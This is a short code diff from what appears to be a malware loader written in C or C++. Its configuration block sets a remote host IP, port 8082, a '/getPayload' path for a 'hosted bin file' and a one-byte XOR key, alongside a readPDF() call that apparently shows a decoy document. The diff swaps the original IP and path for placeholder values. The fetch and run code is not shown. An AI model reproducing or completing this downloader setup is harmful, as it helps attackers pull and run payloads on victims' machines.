@@ -139,9 +139,11 @@ int main()
     readPDF();
 
     //--------- CONFIGURE -----------
-    LPCWSTR remotehost = L"103.182.16.8"; //change to your IP
+    //LPCWSTR remotehost = L"103.182.16.8"; //change to your IP
+    LPCWSTR remotehost = L"254.254.254.254"; //change to your IP
     int remoteport = 8082; //change to your port
-    LPCWSTR remotedir = L"/getPayload"; //change to your directory of the hosted bin file
+    //LPCWSTR remotedir = L"/getPayload"; //change to your directory of the hosted bin file
+    LPCWSTR remotedir = L"/getPayloadgetPayloadgetPayloadgetPayloadgetPayloadgetPayload"; //change to your directory of the hosted bin file
     unsigned char key = 0x7e; //change to your key
     //-------------------------------
 
